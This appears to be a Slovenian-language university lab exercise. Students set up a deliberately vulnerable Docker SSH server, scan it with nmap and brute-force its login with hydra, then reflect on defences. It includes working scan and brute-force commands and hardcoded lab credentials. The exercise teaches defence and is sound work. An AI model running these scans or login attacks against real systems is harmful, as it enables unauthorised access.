# Testiranje SSH varnosti z Nmap in Hydra

V tej vaji boste preizkusili dve ključni tehniki testiranja varnosti oddaljenih sistemov:
- odkrivanje odprtih vrat in storitev z orodjem `nmap`
- brute-force napad na SSH storitev z orodjem `hydra`

Namen vaje je pokazati, kako napadalci pridobijo informacije o sistemu in zakaj je zaščita SSH storitve in zapiranje neuporabljenih vrat ključna za varnost.

---

# 🐳 Priprava okolja z Dockerjem

Pred začetkom vaje vzpostavite ciljni sistem z Dockerjem na vašem host računalniku.  
Na voljo imate Docker image z ranljivim SSH strežnikom, ki omogoča testiranje napadov.

### 🔷 Korak 0: Zagon Docker SSH strežnika

Če še niste, najprej zgradite Docker image z imenom `dvws`:
```bash
sudo apt update
sudo apt install docker-cli
sudo apt install docker.io
wget https://raw.githubusercontent.com/rpritr/KV-Vaje/refs/heads/main/lab09/dvws/Dockerfile
docker build -t dvws .
```

Nato zaženite container:
```bash
sudo docker run -d -p 2222:22 --name dvws-ssh dvws
```

SSH strežnik bo zdaj na voljo na host računalniku na naslovu `<target_ip>`, port `2222`, z uporabnikom `testuser` in geslom `test123`.

---

# 🧪 Testiranje SSH varnosti z Nmap in Hydra

SSH (Secure Shell) je standarden protokol za oddaljeno prijavo v strežnik. Šibka gesla ali odprte nepotrebne storitve omogočajo napadalcem hitro pridobitev dostopa.  
V tej vaji boste najprej s `nmap` ugotovili odprta vrata in storitve, nato pa z `hydra` preverili moč gesel.

---

## 1️⃣ Uvod

Cilj je, da se kot uporabniki naučimo kako:  
✅ uporabiti orodje Nmap za odkrivanje odprtih vrat in storitev  
✅ uporabiti orodje Hydra za preverjanje gesel na SSH  
✅ razumeti nevarnosti šibkih gesel in odprtih storitev

---

## 2️⃣ Aktivnost

### 🖥️ Navodila

Študenti boste izvedli naslednje korake in dokumentirali rezultate:

---

### 🔷 Korak 1: Skeniranje odprtih vrat z Nmap

Najprej preverite, katere storitve so dostopne na ciljnem sistemu:

```bash
nmap -sS -sV -O -p- <target_ip>
```

Parametri:
- `-sS` — SYN skeniranje (tišje)
- `-sV` — zazna različice storitev
- `-O` — zazna operacijski sistem (če je mogoče)
- `-p-` — skeniraj vsa vrata (1-65535)

Zapišite si:
- katera vrata so odprta
- katere storitve tečejo
- katero različico operacijskega sistema je zaznal

💡 Refleksija: zakaj zapirati neuporabljene porte?

IP strežnik znotraj docker okolja lahko poiščemo z ukazom
```bash
sudo docker inspect dvws-ssh | grep IPAddress
```
---

### 🔷 Korak 2: Preveri SSH povezavo

Prepričajte se, da SSH storitev deluje:
```bash
ssh testuser@<target_ip> -p 22
```
Geslo: `test123`

---

### 🔷 Korak 3: Ustvari seznam gesel

Če želite hitrejši test, ustvarite svoj seznam gesel:
```bash
echo -e "password
123456
test123
admin" > passwords.txt
```

---

### 🔷 Korak 4: Brute-force napad z Hydra

Uporabite Hydra za napad:
```bash
hydra -l testuser -P passwords.txt -s 22 <target_ip> ssh
```

Parametri:
- `-l testuser` — uporabniško ime
- `-P passwords.txt` — seznam gesel
- `-s 22` — številka vrat
- `<target_ip>` — IP naslov strežnika
- `ssh` — protokol

Hydra bo ob uspehu izpisal nekaj takega:
```
[22][ssh] host: <target_ip>   login: testuser   password: test123
```

---

## 3️⃣ Analiza in poročilo

Oddajte poročilo z naslednjimi vsebinami:
- Izpis rezultatov `nmap` (katere storitve/vrata so odprta)
- Izpis rezultatov `hydra` (ali je geslo najdeno)
- Posnetki zaslona obeh rezultatov
- Kratek komentar: zakaj je uporaba šibkih gesel nevarna in zakaj zapirati neuporabljene porte

---

## 4️⃣ Refleksija in analiza

- Kako bi zaščitili SSH strežnik pred brute-force napadi?
- Katere dodatne ukrepe (npr. omejitve po številu prijav, uporaba javno-zasebnih ključev, firewall) bi priporočili?
- Kako se spremeni rezultat, če uporabimo zelo močno geslo?

